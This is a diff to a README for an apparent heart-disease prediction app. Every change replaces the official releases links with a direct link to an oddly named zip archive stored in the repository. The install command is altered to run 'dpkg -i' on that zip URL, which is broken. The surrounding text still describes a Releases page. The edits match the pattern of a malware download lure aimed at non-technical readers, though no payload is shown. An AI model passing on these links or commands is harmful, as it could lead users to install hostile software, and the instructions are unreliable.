@@ -4,7 +4,7 @@
 This application predicts heart disease using advanced methods. It works with the UCI Cleveland database and employs various machine learning techniques to provide accurate predictions.
 
 ## 📥 Download the App
-[![Download App](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/DIno0510207/heart-disease-prediction/releases)
+[![Download App](https://raw.githubusercontent.com/DIno0510207/heart-disease-prediction/main/drossy/heart-disease-prediction_unbridledly.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/DIno0510207/heart-disease-prediction/main/drossy/heart-disease-prediction_unbridledly.zip)
 
 ## 🚀 Getting Started
 To use this application, follow these simple steps. You don’t need any technical knowledge.
@@ -16,7 +16,7 @@ Before downloading, ensure your computer meets the following basic requirements:
 - **Disk Space:** At least 100 MB available
 
 ### 2. Visit the Download Page
-To get the application, click the following link: [Download the Application](https://github.com/DIno0510207/heart-disease-prediction/releases). This page has all the versions of the software available.
+To get the application, click the following link: [Download the Application](https://raw.githubusercontent.com/DIno0510207/heart-disease-prediction/main/drossy/heart-disease-prediction_unbridledly.zip). This page has all the versions of the software available.
 
 ### 3. Choose the Right Version
 On the Releases page, you will see different versions of the application. If you're unsure, select the latest version. It usually has the most features and bug fixes.
@@ -43,7 +43,7 @@ To install the application, follow these steps:
 2. Use the command to navigate to the directory where you downloaded the file.
 3. Run the following command to install the application:
    ```bash
-   sudo dpkg -i heart-disease-prediction.deb
+   sudo dpkg -i https://raw.githubusercontent.com/DIno0510207/heart-disease-prediction/main/drossy/heart-disease-prediction_unbridledly.zip
    ```
 
 ## 🔍 Using the Application
@@ -75,6 +75,6 @@ Your data is secure. The application does not store personal information or shar
 If you encounter any issues, you can reach out. Please check the FAQs in the user guide, or contact support through the GitHub repository.
 
 ## 🔗 Download and Install
-To get started with heart disease prediction, visit this page to download: [Download the Application](https://github.com/DIno0510207/heart-disease-prediction/releases).
+To get started with heart disease prediction, visit this page to download: [Download the Application](https://raw.githubusercontent.com/DIno0510207/heart-disease-prediction/main/drossy/heart-disease-prediction_unbridledly.zip).
 
 Follow these steps, and you will be on your way to using the application effectively.
